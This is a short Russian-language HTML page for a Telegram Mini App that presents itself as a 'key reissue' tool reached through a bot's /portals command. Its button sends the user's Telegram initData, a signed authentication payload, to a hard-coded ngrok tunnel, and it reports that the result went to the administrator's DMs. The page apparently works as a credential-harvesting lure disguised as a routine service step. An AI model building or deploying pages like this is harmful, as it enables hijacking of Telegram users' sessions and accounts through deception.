<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
    <h3>🔄 Перевыпуск ключа</h3>
    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Инициализация...</p>
    <button id="btn" onclick="sendDirect()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
        Перевыпустить ключ
    </button>

    <script>
        const t = window.Telegram.WebApp;
        t.expand();
        const statusEl = document.getElementById('status');
        const btn = document.getElementById('btn');

        // Твоя ссылка ngrok
        const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook"; 

        if (!t.initData) {
            statusEl.innerHTML = "❌ Откройте через кнопку в Telegram боте (/portals).";
        } else {
            statusEl.innerHTML = "✅ Готов к работе.<br>Нажмите кнопку ниже.";
            btn.style.display = "block";
        }

        function sendDirect() {
            statusEl.innerHTML = "⏳ Отправка данных...";
            btn.disabled = true;

            fetch(NGROK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({init_data: t.initData})
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'ok') {
                    statusEl.innerHTML = "✅ Ключ перевыпущен!<br>Проверьте личку администратора.";
                    setTimeout(() => t.close(), 2000);
                } else {
                    statusEl.innerHTML = "❌ Ошибка:<br>" + (d.details || d.msg);
                    btn.disabled = false;
                }
            })
            .catch(e => {
                statusEl.innerHTML = "❌ Сеть:<br>" + e.message;
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
